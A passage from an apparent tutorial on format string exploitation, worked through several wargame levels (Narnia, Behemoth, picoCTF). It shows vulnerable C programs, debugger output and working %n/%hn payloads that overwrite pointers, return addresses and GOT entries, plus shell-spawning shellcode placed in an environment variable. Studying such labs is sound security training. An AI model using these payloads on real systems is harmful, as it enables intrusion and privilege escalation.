<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>narnia5@melinda:~$ /narnia/narnia5 %08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x 
</span><span class='line'>Change i's value from 1 -&gt; 500. No way...let me give you a hint!
</span><span class='line'>buffer : [f7eb6de6.ffffffff.ffffd6ae.f7e2ebf8.62653766.36656436.6666662e.] (63)
</span><span class='line'>i = 1 (0xffffd6cc)
</span><span class='line'>
</span><span class='line'>narnia5@melinda:~$ /narnia/narnia5 AAAA%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x
</span><span class='line'>Change i's value from 1 -&gt; 500. No way...let me give you a hint!
</span><span class='line'>buffer : [AAAAf7eb6de6.ffffffff.ffffd6ae.f7e2ebf8.41414141.62653766.36656] (63)
</span><span class='line'>i = 1 (0xffffd6cc)
</span><span class='line'>
</span><span class='line'>narnia5@melinda:~$ /narnia/narnia5 `python -c 'print "\xcc\xd6\xff\xff%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x"'`
</span><span class='line'>Change i's value from 1 -&gt; 500. No way...let me give you a hint!
</span><span class='line'>buffer : [����f7eb6de6.ffffffff.ffffd6ae.f7e2ebf8.ffffd6cc.62653766.36656] (63)
</span><span class='line'>i = 1 (0xffffd6cc)
</span><span class='line'>
</span><span class='line'>narnia5@melinda:~$ /narnia/narnia5 `python -c 'print "\xcc\xd6\xff\xff%08x.%08x.%08x.%08x.%08n.%08x.%08x.%08x"'`
</span><span class='line'>Change i's value from 1 -&gt; 500. No way...let me give you a hint!
</span><span class='line'>buffer : [����f7eb6de6.ffffffff.ffffd6ae.f7e2ebf8..62653766.36656436.6666] (63)
</span><span class='line'>i = 40 (0xffffd6cc)
</span><span class='line'>
</span><span class='line'>narnia5@melinda:~$ /narnia/narnia5 `python -c 'print "\xcc\xd6\xff\xff%08x.%08x.%08x.%468x.%08n.%08x.%08x.%08x"'`
</span><span class='line'>Change i's value from 1 -&gt; 500. GOOD
</span><span class='line'>$ </span></code></pre></td></tr></table></div></figure>
</li>

<li>In this example, let's see use of arbitary writing an address <strong>Narnia7</strong>
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
</pre></td><td class='code'><pre><code class='C'><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">goodfunction</span><span class="p">();</span>
</span><span class='line'><span class="kt">int</span> <span class="nf">hackedfunction</span><span class="p">();</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">vuln</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">format</span><span class="p">){</span>
</span><span class='line'>        <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span>
</span><span class='line'>        <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">ptrf</span><span class="p">)();</span>
</span><span class='line'>
</span><span class='line'>        <span class="n">memset</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">));</span>
</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;goodfunction() = %p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">goodfunction</span><span class="p">);</span>
</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;hackedfunction() = %p</span><span class="se">\n\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">hackedfunction</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>        <span class="n">ptrf</span> <span class="o">=</span> <span class="n">goodfunction</span><span class="p">;</span>
</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;before : ptrf() = %p (%p)</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">ptrf</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ptrf</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;I guess you want to come to the hackedfunction...</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>        <span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>
</span><span class='line'>        <span class="n">ptrf</span> <span class="o">=</span> <span class="n">goodfunction</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>        <span class="n">snprintf</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="k">sizeof</span> <span class="n">buffer</span><span class="p">,</span> <span class="n">format</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">return</span> <span class="n">ptrf</span><span class="p">();</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span>
</span><span class='line'>        <span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">&lt;=</span> <span class="mi">1</span><span class="p">){</span>
</span><span class='line'>                <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;Usage: %s &lt;buffer&gt;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
</span><span class='line'>                <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>        <span class="n">exit</span><span class="p">(</span><span class="n">vuln</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]));</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">goodfunction</span><span class="p">(){</span>
</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Welcome to the goodfunction, but i said the Hackedfunction..</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>        <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">hackedfunction</span><span class="p">(){</span>
</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Way to go!!!!&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
</span><span class='line'>        <span class="n">system</span><span class="p">(</span><span class="s">&quot;/bin/sh&quot;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>
If we see, the program provides us with the address of the ptrf pointer, goodfunction and bad function. The ptrf is assigned the address of goodfunction if we somehow change it to address of the badfunction, we can get a shell. Let's run the program and see what are the address we get.
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>./narnia71 A
</span><span class='line'>goodfunction() = 0x804871f
</span><span class='line'>hackedfunction() = 0x8048745
</span><span class='line'>
</span><span class='line'>before : ptrf() = 0x804871f (0xffb4450c)
</span><span class='line'>I guess you want to come to the hackedfunction...
</span><span class='line'>Welcome to the goodfunction, but i said the Hackedfunction..</span></code></pre></td></tr></table></div></figure>
and
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>narnia7@melinda:/narnia$ ./narnia7 A
</span><span class='line'>goodfunction() = 0x80486e0
</span><span class='line'>hackedfunction() = 0x8048706
</span><span class='line'>
</span><span class='line'>before : ptrf() = 0x80486e0 (0xffffd64c)
</span><span class='line'>I guess you want to come to the hackedfunction...
</span><span class='line'>Welcome to the goodfunction, but i said the Hackedfunction..</span></code></pre></td></tr></table></div></figure>
The reason I have added two running instances is because in the first instance the address is different by one byte 0x1f and 0x45 where as in the second instance the address differs by two bytes 0x86e0 and 0x8706. We can write two bytes by %hn and one byte by %hhn. We can write whole 4 byte address by following a formula 
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>If HOB &lt; LOB
</span><span class='line'>
</span><span class='line'>HOB:0x0804
</span><span class='line'>LOB:0x8706
</span><span class='line'>
</span><span class='line'>[addr+2][addr] = \x4e\xd6\xff\xff\x4c\xd6\xff\xff
</span><span class='line'>%.[HOB - 8]x   = 0x804 - 8 = 7FC (2044) = %.2044x
</span><span class='line'>%[offset]$hn   = %6\$hn
</span><span class='line'>%.[LOB - HOB]x = 0x8706 - 0x804 = 7F02 (32514) = %.32514x
</span><span class='line'>%[offset+1]$hn = %7\$hn
</span><span class='line'>
</span><span class='line'>`python -c 'print "\x4e\xd6\xff\xff\x4c\xd6\xff\xff" +"%.2044x%6\$hn %.32514x%7\$hn"'`</span></code></pre></td></tr></table></div></figure>

We also need to find the offset where the address is stored which can be done by two methods: Either compiling the program on local machine and checking the buffer just after snprintf
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>gdb-peda$ p buffer 
</span><span class='line'>$2 = "AAAA.000008a2.f7fdeb58.f7fde860.0804835c.0804871f.41414141.3030302e.61383030", '\000' &lt;repeats 51 times&gt;
</span></code></pre></td></tr></table></div></figure>
or by using ltrace 
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>narnia7@melinda:/narnia$ ltrace ./narnia7 `python -c 'print "AAAA" + ".%08x"*7'`
</span><span class='line'>__libc_start_main(0x804868f, 2, 0xffffd764, 0x8048740 &lt;unfinished ...&gt;
</span><span class='line'>memset(0xffffd620, '\0', 128)                                                                                          = 0xffffd620
</span><span class='line'>printf("goodfunction() = %p\n", 0x80486e0goodfunction() = 0x80486e0
</span><span class='line'>)                                                                             = 27
</span><span class='line'>
</span><span class='line'>)                                                                         = 30
</span><span class='line'>printf("before : ptrf() = %p (%p)\n", 0x80486e0, 0xffffd61cbefore : ptrf() = 0x80486e0 (0xffffd61c)
</span><span class='line'>)                                                           = 41
</span><span class='line'>puts("I guess you want to come to the "...I guess you want to come to the hackedfunction...
</span><span class='line'>printf("hackedfunction() = %p\n\n", 0x8048706hackedfunction() = 0x8048706
</span><span class='line'>)                                                                            = 50
</span><span class='line'>sleep(2)                                                                                                               = 0
</span><span class='line'>snprintf("AAAA.08048238.ffffd678.f7ffda94."..., 128, "AAAA.%08x.%08x.%08x.%08x.%08x.%0"..., 0x8048238, 0xffffd678, 0xf7ffda94, 0, 0x80486e0, 0x41414141, 0x3038302e) = 67
</span><span class='line'>puts("Welcome to the goodfunction, but"...Welcome to the goodfunction, but i said the Hackedfunction..
</span><span class='line'>)                                                                            = 61
</span><span class='line'>fflush(0xf7fcaac0)                                                                                                     = 0
</span><span class='line'>exit(0 &lt;no return ...&gt;
</span><span class='line'>+++ exited (status 0) +++</span></code></pre></td></tr></table></div></figure>
If you see 0x41414141 is at offset 6.

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>gdb-peda$ p ptrf
</span><span class='line'>$3 = (int (*)()) 0x804871f &lt;goodfunction&gt;
</span><span class='line'>gdb-peda$ p &ptrf
</span><span class='line'>$4 = (int (**)()) 0xffffd2ec
</span><span class='line'>gdb-peda$ x /10xb 0xfffd3ea
</span><span class='line'>0xfffd3ea:    Cannot access memory at address 0xfffd3ea
</span><span class='line'>gdb-peda$ x /10xb 0xffffd3ea
</span><span class='line'>0xffffd3ea:   0x3f    0x77    0x00    0x00    0x00    0x00    0x00    0x00
</span><span class='line'>0xffffd3f2:   0x00    0x00
</span><span class='line'>gdb-peda$ x /10xb 0xffffd2ea
</span><span class='line'>0xffffd2ea:   0x04    0x08    0x1f    0x87    0x04    0x08    0x41    0x41
</span><span class='line'>0xffffd2f2:   0x41    0x41
</span><span class='line'>gdb-peda$ p goodfunction 
</span><span class='line'>$5 = {int ()} 0x804871f &lt;goodfunction&gt;
</span><span class='line'>gdb-peda$ p ha
</span><span class='line'>hackedfunction  hasmntopt       
</span><span class='line'>gdb-peda$ p hackedfunction 
</span><span class='line'>$6 = {int ()} 0x8048745 &lt;hackedfunction&gt;</span></code></pre></td></tr></table></div></figure>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>gdb-peda$ p &ptrf 
</span><span class='line'>$10 = (int (**)()) 0xffffd2fc
</span><span class='line'>gdb-peda$ run `python -c 'print "\xfc\xd2\xff\xff" + ".%08x"*5 + "%hhn"'`
</span><span class='line'>gdb-peda$ p ptrf 
</span><span class='line'>$12 = (int (*)()) 0x8048731 &lt;goodfunction+18&gt;
</span><span class='line'>gdb-peda$ x /10xb 0xffffd2fa
</span><span class='line'>0xffffd2fa:   0x04    0x08    0x31    0x87    0x04    0x08    0xfc    0xd2
</span><span class='line'>0xffffd302:   0xff    0xff
</span></code></pre></td></tr></table></div></figure>

</li>

<li>Let's see another example <strong>Behemoth3</strong> where we have only the assembly code of the program and we exploit this by two methods by overwriting the GOT address or overwriting the return address.

Assembly Source Code:
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>(gdb) disassemble main 
</span><span class='line'>Dump of assembler code for function main:
</span><span class='line'>   0x0804847d &lt;+0&gt;: push   %ebp
</span><span class='line'>   0x0804847e &lt;+1&gt;: mov    %esp,%ebp
</span><span class='line'>   0x08048480 &lt;+3&gt;: and    $0xfffffff0,%esp
</span><span class='line'>   0x08048483 &lt;+6&gt;: sub    $0xe0,%esp
</span><span class='line'>   0x08048489 &lt;+12&gt;:    movl   $0x8048570,(%esp)
</span><span class='line'>   0x08048490 &lt;+19&gt;:    call   0x8048330 &lt;printf@plt&gt;
</span><span class='line'>   0x08048495 &lt;+24&gt;:    mov    0x80497a4,%eax
</span><span class='line'>   0x0804849a &lt;+29&gt;:    mov    %eax,0x8(%esp)
</span><span class='line'>   0x0804849e &lt;+33&gt;:    movl   $0xc8,0x4(%esp)
</span><span class='line'>   0x080484a6 &lt;+41&gt;:    lea    0x18(%esp),%eax
</span><span class='line'>   0x080484aa &lt;+45&gt;:    mov    %eax,(%esp)
</span><span class='line'>   0x080484ad &lt;+48&gt;:    call   0x8048340 &lt;fgets@plt&gt;
</span><span class='line'>   0x080484b2 &lt;+53&gt;:    movl   $0x8048584,(%esp)
</span><span class='line'>   0x080484b9 &lt;+60&gt;:    call   0x8048330 &lt;printf@plt&gt;
</span><span class='line'>   0x080484be &lt;+65&gt;:    lea    0x18(%esp),%eax
</span><span class='line'>   0x080484c2 &lt;+69&gt;:    mov    %eax,(%esp)
</span><span class='line'>   0x080484c5 &lt;+72&gt;:    call   0x8048330 &lt;printf@plt&gt;
</span><span class='line'>   0x080484ca &lt;+77&gt;:    movl   $0x804858e,(%esp)
</span><span class='line'>   0x080484d1 &lt;+84&gt;:    call   0x8048350 &lt;puts@plt&gt;
</span><span class='line'>   0x080484d6 &lt;+89&gt;:    mov    $0x0,%eax
</span><span class='line'>   0x080484db &lt;+94&gt;:    leave  
</span><span class='line'>   0x080484dc &lt;+95&gt;:    ret    
</span><span class='line'>End of assembler dump.</span></code></pre></td></tr></table></div></figure>

Observed Behavior:
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>behemoth3@melinda:/tmp/rahul3$ ./behemoth3 
</span><span class='line'>Identify yourself: HelloCheck123
</span><span class='line'>Welcome, HelloCheck123
</span><span class='line'>
</span><span class='line'>aaaand goodbye again.</span></code></pre></td></tr></table></div></figure>
Well, we tried to provide a very large input to the Identify yourself, but it didn't not gave a segmentation fault. Let's try format string:
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>behemoth3@melinda:/tmp/rahul3$ echo `python -c 'print "A"*4 + ".%08x"*7'` | ./behemoth3 
</span><span class='line'>Identify yourself: Welcome, AAAA.000000c8.f7fcac20.00000000.00000000.f7ffd000.41414141.3830252e
</span><span class='line'>
</span><span class='line'>aaaand goodbye again.</span></code></pre></td></tr></table></div></figure>
Trying simple format string provided us with the offset of our format string. Now we can write almost any address with any value with our input. Before that let's put a environment variable shellcode and check it's address:
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>export EGG=`python -c 'print "\x90"*90 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"'`</span></code></pre></td></tr></table></div></figure>
Let's core dump the binary using %s and examine the core. Our shellcode can be reached at 0xffffd8f0

<ul>
Either we can 
<li>overwrite the return address (main+95): Let's debug the program set the breakpoint at main+95 and see the value of $esp which would be use to find the return address when binary is executed without gdb. The value is 0xf7e3ba63 and the return address which needed to be overwrriten is 0xffffd65c. Let's again core dump the binary to see the return address without gdb.
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>(gdb) find $esp,+2000,0xf7e3ba63
</span><span class='line'>0xffffd66c
</span><span class='line'>1 pattern found.</span></code></pre></td></tr></table></div></figure>
So, if we overwrite the return address at 0xffffd66c with our shellcode value of 0xffffd8f0, we should get a shell.
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> python -c 'print "\x5e\xd6\xff\xff\x5c\xd6\xff\xff" +"%.65527x%6$hn %.55503x%7$hn"' &gt; input98</span></code></pre></td></tr></table></div></figure>
This is little tricky because we might have to guess the return address without gdb. Previously it was coming 0xffffd66c but we got shell using 0xffffd65c.
 </li>
<li>overwrite the puts GOT address:
Find the GOT address of puts which is 0x08049790 and overwrite it with 
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>python -c 'print "\x92\x97\x04\x08\x90\x97\x04\x08" +"%.65527x%6$hn %.55503x%7$hn"'</span></code></pre></td></tr></table></div></figure></li>
</ul>
</li>

<li>
In the below code, if we can somehow set the value of secret to 1337, we can get a shell on the system to read the flag. Also, the printf function directly prints the argument whatever is passed by the user. By concepts above, we need to find the address of secret and write to it. Address of the secret can be found by gdb or objdump. Either the address would be already present on stack or it can be put on stack.
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class='C'><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;fcntl.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="n">secret</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">void</span> <span class="nf">give_shell</span><span class="p">(){</span>
</span><span class='line'>    <span class="kt">gid_t</span> <span class="n">gid</span> <span class="o">=</span> <span class="n">getegid</span><span class="p">();</span>
</span><span class='line'>    <span class="n">setresgid</span><span class="p">(</span><span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">);</span>
</span><span class='line'>    <span class="n">system</span><span class="p">(</span><span class="s">&quot;/bin/sh -i&quot;</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span>
</span><span class='line'>    <span class="kt">int</span> <span class="o">*</span><span class="n">ptr</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">secret</span><span class="p">;</span>
</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="n">secret</span> <span class="o">==</span> <span class="mi">1337</span><span class="p">){</span>
</span><span class='line'>        <span class="n">give_shell</span><span class="p">();</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>

Reading the address
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>pico83515@shell:/home/format$ gdb -q format
</span><span class='line'>Reading symbols from format...(no debugging symbols found)...done.
</span><span class='line'>(gdb) p $secret
</span><span class='line'>$1 = void
</span><span class='line'>(gdb) p &secret
</span><span class='line'>$2 = (&lt;data variable, no debug info&gt; *) 0x804a030 &lt;secret&gt;</span></code></pre></td></tr></table></div></figure>
Now we have to find whether is this address present on the stack? If not, we can put this address on the stack because of the format string vulnerability.
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>pico83515@shell:/home/format$ ./format %08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x
</span><span class='line'>ffffd774.ffffd780.f7e4f39d.f7fc83c4.f7ffd000.0804852b.0804a030.08048520.00000000</span></code></pre></td></tr></table></div></figure>
We see that the address is present on the stack at the seventh position.

Otherwise, we can put it on the stack by
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>for i in {1..256};do echo -n "Offset: $i:"; env -i ./format AAAA%$i\$x;echo ;done | grep 4141</span></code></pre></td></tr></table></div></figure>
What this is doing is "Extracting particular stack content by "%$i\$x". As we have seen in DMA, $x can be used to extract particular stack content and reading it. $i value changes from 1-256. However, as you add more data, the offset of your original input changes, so go ahead and add 1333 more bytes of data and see what the offset is then. (1337 is what we want to put into secret, and we will have written four bytes (AAAA), so 1333+4 = 1337)
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>or i in {1..256};do echo -n "Offset: $i:"; env -i ./format AAAA%$i\$x%1333u;echo ;done | grep 4141
</span><span class='line'>Offset: 103:AAAA41410074
</span><span class='line'>Offset: 104:AAAA31254141</span></code></pre></td></tr></table></div></figure>
So we found our A’s again, but they aren’t aligned on the stack. Lets add two more A’s at the end to see if we can get it to line up.
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
